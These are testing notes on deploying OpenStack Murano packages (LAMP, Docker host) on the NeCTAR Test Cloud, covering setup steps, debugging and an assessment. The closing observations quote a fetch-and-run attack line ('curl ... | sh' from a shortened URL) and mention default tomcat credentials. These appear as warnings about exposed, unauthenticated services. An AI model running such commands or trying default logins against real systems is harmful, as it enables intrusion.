==================================
Murano: Tests on NeCTAR Test Cloud
==================================

Date of Testing: 8-Apr-2016

The following document is based on notes on testing the Murano deployment on the NeCTAR Test Cloud
https://dashboard.test.rc.nectar.org.au with the intent of understanding:

- How to use Murano?
- What is it good for?


"""""""""""""

*************
General Notes
*************

- If you get an error with importing one of the standard packages, just try a few times until it works.
- When browsing packages on https://apps.openstack.org/#tab=murano-apps, don't forget to check on the **"Depends On"** section to
  add any other packages or images required. They in turn may have more dependencies.

"""""""""""""

****************
Debugging Murano
****************

This is what I found useful:

- Dashboard > Applications > Applications Catalog > Environments > (selected environment) > Topology tab

        This visually shows you what you are trying to build. 

        The entity nodes will display whether it was successful or failed according to Murano.

- Dashboard > Applications > Applications Catalog > Environments > (selected environment) > Lastest Deployment Log tab

        Log of sequence of actions Murano conducted during the build steps. 

        The logs come from the packages so the verbosity depends on the author of the package. Find them in the package's
Classes/\*.yaml

- Dashboard > Project > Orchestration > Stacks > (selected stack) > Template

Shows you the actual HEAT template that MURANO generated for your environment.

For example, you'll find bugs in the packages due to hardcoded text displayed here.

- VM Instance > SSH > /var/log/murano-agent.log

Lots of logs. It should show you where the deployment stopped if you are debugging the instance setup problems.

"""""""""""""


********************************************
LAMP Environment from multiple components
********************************************

**Packages:**

Packages can be found at https://apps.openstack.org/#tab=murano-apps but here are the links to the ones I used:

1. MySQL 

 - http://storage.apps.openstack.org/apps/io.murano.databases.MySql.zip
 - https://github.com/openstack/murano-apps/tree/master/MySQL/package

2. Apache

 - http://storage.apps.openstack.org/apps/io.murano.apps.apache.ApacheHttpServer.zip
 - https://github.com/openstack/murano-apps/tree/master/ApacheHTTPServer/package

**Setup:**

1. Download package zip files

2. Log on to test cloud 

3. Go to Applications > Manage > Package Definitions

4. Click 'Import Package', upload both packages

5. Go to Applications > Applications Catalog > Environments

6. Click 'Create Environment', name it and leave defaults

7. Drag & Drop 'Apache HTTP Server' as a component, Enable PHP YES, Floating IP YES

 - Choose any instance flavour
 - Instance Image: Ubuntu 14.04 x64 (pre-installed murano-agent)
 - Your key pair
 - Availability zone: **coreservices** (the only one working at time of writing on test cloud)

8. Drag & Drop 'MySQL' as a component, Floating IP YES

 - Set Database name, Username, Password, Confirm Password
 - **Note them somewhere!!! You will need it later to use the database.**
 - Choose any instance flavour
 - Instance Image: Ubuntu 14.04 x64 (pre-installed murano-agent)
 - Your key pair
 - Availability zone: **coreservices** (the only one working at time of writing on test cloud)

9. Click 'Deploy This Environment'

Murano will generate HEAT templates from what we have specified. It will automatically add a few things on your behalf like private
networks and router. You can customise this too but we left it as defaults. 

HEAT Orchestration will follow automatically, building the full system specified.

10. Post-Murano Actions to complete the exercise

 - Add Security Group for MySQL port and apply to MySQL instance
 - SSH onto Apache server to add application code. This is the point where you will utilise the database name, username and password
   credentials, created when specifying the MySQL component


Test Observations:

- Test Cloud Murano is still buggy. 2 out of my 3 deployments failed. No real changes between these attempts other than "try again".

- MySQL component in particular: Deployment logs will state deployment complete although after logging on the server, it is not
  installed. Of course eventually it worked in subsequent full environment deployments.

- The Good: Good for developers / system admins who are composing the environment as a once off and don't mind manually doing the
  remaining tasks

- The Bad: Not great if you are looking at this to deploy your App by composing multiple packages. If that is the case, make your
  own single-package that does both MySQL+Apache and automate Security Groups, Application deployment and even the database
credentials. 

"""""""""""""

**********************
Docker StandAlone Host
**********************

**Packages:**

Packages can be found at https://apps.openstack.org/#tab=murano-apps but here are the links to the ones I used:

1. Docker Interface Library (dependency)

 - http://storage.apps.openstack.org/apps/io.murano.apps.docker.Interfaces.zip
 - https://github.com/openstack/murano-apps/tree/master/Docker/DockerInterfacesLibrary

2. Docker StandAlone Host

 - http://storage.apps.openstack.org/apps/io.murano.apps.docker.DockerStandaloneHost.zip
 - https://github.com/openstack/murano-apps/tree/master/Docker/DockerStandaloneHost

**Pre-requisites:**

3. Docker image

 - Download image from - https://apps.openstack.org/#tab=glance-images&asset=Debian%208%20x64%20(pre-installed%20Docker)
 - Have your OpenStack API credentials ready
 - Make sure you have the glance CLI
 - ``glance --os-image-api-version 1 image-create --file debian-8-docker.qcow2 --disk-format qcow2 --container-format bare --name
   'ubuntu14.04-x64-docker' --property murano_image_info="{\"title\": \"ubuntu14.04-x64-docker\", \"type\": \"linux\"}"``


**Setup:**

1. Download package zip files

2. Log on to test cloud 

3. Go to Applications > Manage > Package Definitions

4. Click 'Import Package', upload both packages

5. Go to Applications > Applications Catalog > Environments

6. Click 'Create Environment', name it and leave defaults

7. Drag & Drop 'Docker StandAlone Host' as a component, Floating IP YES

 - Choose any instance flavour
 - Your key pair
 - Availability zone: **coreservices** (the only one working at time of writing on test cloud)

8. Post-Murano Actions to complete the exercise

 - SSH onto server
 - Run ``docker pull ...`` commands as needed
 - Run ``docker run ...`` commands as needed
 - Add Security Groups for the instance as needed (e.g. http)


Test Observations:

- Quite easy to do. I'm not sure what the Murano package adds other than instantiating the image.

- Quite a few of the other Murano Community Applications apply this practice of loading a pre-built image rather than risking HEAT
  templates to call shell, ansible/puppet...etc to install software.

- The Good: It is a really good example of wrapping up a perfected image and then giving it a GUI on the horizon dashboard that you
  can add a few parameters to customise. 

- The Bad: This can give the illusion that you are getting an Application, like Software as a Service or in this case, a PaaS.
  However, the user actually still has all the responsibilities of the instance such as server patching, maintenance, backup,
vulnerability risks ...etc of a machine that will be on the internet. 

- In this case, I added a container for ipython notebooks on my Docker host. The following observation is true for a Murano package
  of a ipython VM instance though: ipython has no concept of users, it would not be hard for a malicious user scanning NeCTAR IP
addresses to find this service, start a new notebook and run '``!curl http://bit.ly/blahblah | sh``'. 

 - What about apache tomcat with all the default tomcat:tomcat user/pass out there?
 - Or an R studio with some default user/password for another '``system(curl|sh)``'?
 - So far, packages on the Murano community catalog seems to require a few post-deployment system admin tasks for the user to
   perform before it is ready depending on the application.
 - My point is that there is a level of IT design consideration by the package author and/or user to address. Based on this, I
   believe the user should still have some degree of system admin skills.

